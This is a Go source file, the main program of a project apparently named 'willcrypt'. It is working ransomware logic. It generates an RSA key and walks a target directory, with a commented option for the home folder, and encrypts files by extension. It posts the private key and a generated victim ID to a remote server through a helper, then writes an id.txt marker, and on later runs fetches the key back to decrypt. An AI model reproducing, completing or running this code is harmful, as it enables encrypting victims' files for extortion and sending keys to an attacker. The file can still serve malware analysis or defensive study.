package main

import (
	"crypto/rsa"
	"sync/atomic"

	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"

	"github.com/spf13/pflag"
	"github.com/sywc670/willcrypt/internal/config"
	"github.com/sywc670/willcrypt/internal/utils"
	"github.com/sywc670/willcrypt/pkg/gowalk"
	"github.com/sywc670/willcrypt/pkg/wcrypt"
)

var Debug bool
var TargetDir string

func init() {
	pflag.StringVarP(&TargetDir, "dir", "d", ".", "default '.'")
	pflag.BoolVarP(&Debug, "debug", "v", false, "default false")
}

func main() {
	pflag.Parse()
	var shouldEncrypt bool
	var priv *rsa.PrivateKey

	idFile, err := os.Open("id.txt")

	if err == nil {
		content, err := io.ReadAll(idFile)
		idFile.Close()

		if err != nil {
			panic(err)
		}

		id := strings.Split(string(content), "\r\n")[1]

		debugf("id: %s\n", id)

		priv = utils.GetKey(id)
	} else {
		fmt.Println("Generating PrivateKey")
		priv = utils.GenerateKey()
		shouldEncrypt = true
	}

	fmt.Println()
	fmt.Println(utils.Stringify(priv))

	// startDir := utils.GetHomeDir()
	startDir := TargetDir

	encryptionOrDecryption := func(filepath string, isEncrypted bool) {
		if shouldEncrypt && !isEncrypted {
			wcrypt.Encrypt(filepath, priv)
		} else {
			wcrypt.Decrypt(filepath, priv)
		}
	}

	walk(startDir, encryptionOrDecryption)

	if shouldEncrypt {
		id := utils.GenerateID()

		debugf("id: %s\n", id)
		debugf("private key: %s\n", utils.Stringify(priv))

		utils.PostKey(priv, id)

		data := "# Do not modify this file, it contains your ID matching the encryption key\r\n" + id

		os.WriteFile("id.txt", []byte(data), 0777)
	}
}

func walk(startDir string, fn func(string, bool)) {
	var count int32

	filter := func(filePath string, args ...any) {
		var proceed bool

		for _, ext := range config.Extensions {
			if strings.HasSuffix(filePath, ext) || strings.HasSuffix(filePath, config.LockedExtension) {
				proceed = true
				break
			}
		}

		for _, dir := range config.IgnoreDirs {
			if strings.Contains(filepath.Dir(filePath), dir) {
				proceed = false
				break
			}
		}

		if proceed && count < config.ProcessMax {
			atomic.AddInt32(&count, 1)

			isEncrypted := strings.HasSuffix(filePath, config.LockedExtension)

			fn(filePath, isEncrypted)
		}

	}

	gowalk.Walk(startDir, filter)
}
